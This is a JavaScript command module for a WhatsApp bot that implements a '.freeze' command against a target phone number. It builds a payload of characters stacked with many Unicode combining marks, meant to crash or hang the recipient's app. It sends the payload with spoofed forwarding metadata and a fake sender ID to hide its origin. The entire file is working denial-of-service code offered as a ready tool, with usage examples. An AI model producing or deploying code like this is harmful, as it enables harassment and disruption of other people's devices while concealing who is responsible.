const COMBINING = '\u0300\u0301\u0302\u0303\u0308\u030A\u030B\u0324\u0325\u0326\u0327\u0328';

function buildFreeze(level = 2) {
  const counts = { 1: 50, 2: 150, 3: 400 };
  const n = counts[level] || 150;
  let payload = '';
  for (let i = 0; i < n; i++) {
    payload += 'F' + COMBINING.repeat(Math.ceil(n / 12));
  }
  return payload;
}

function normalizePhone(raw) {
  return raw.replace(/\D/g, '');
}

const GHOST_JID = '0000000000@s.whatsapp.net';

export default {
  name: 'freeze',
  alias: ['freezephone', 'freezeapp', 'freezewa'],
  description: 'Freeze a target phone. Usage: .freeze <phone> [level 1-3]',
  category: 'bug',

  async execute(sock, m, args, PREFIX) {
    const senderJid = m.key.remoteJid;

    if (!args[0]) {
      return sock.sendMessage(senderJid, {
        text: `❌ Usage: ${PREFIX}freeze <phone> [level 1-3]\n\n` +
              `Example: ${PREFIX}freeze 254733961184\n` +
              `Example: ${PREFIX}freeze 254733961184 3`
      }, { quoted: m });
    }

    const phone  = normalizePhone(args[0]);
    const level  = Math.min(3, Math.max(1, parseInt(args[1]) || 2));
    const target = `${phone}@s.whatsapp.net`;
    const payload = buildFreeze(level);

    const msgOptions = {
      contextInfo: {
        forwardingScore : 999,
        isForwarded     : true,
        remoteJid       : GHOST_JID,
        participant     : GHOST_JID,
        fromMe          : false
      }
    };

    try {
      await sock.sendMessage(senderJid, { react: { text: '❄️', key: m.key } });

      await sock.sendMessage(target, { text: payload }, msgOptions);

      await sock.sendMessage(senderJid, {
        text: `✅ Freeze sent to +${phone} (level ${level})`
      }, { quoted: m });

    } catch (err) {
      await sock.sendMessage(senderJid, {
        text: `❌ Failed: ${err.message}`
      }, { quoted: m });
    }
  }
};
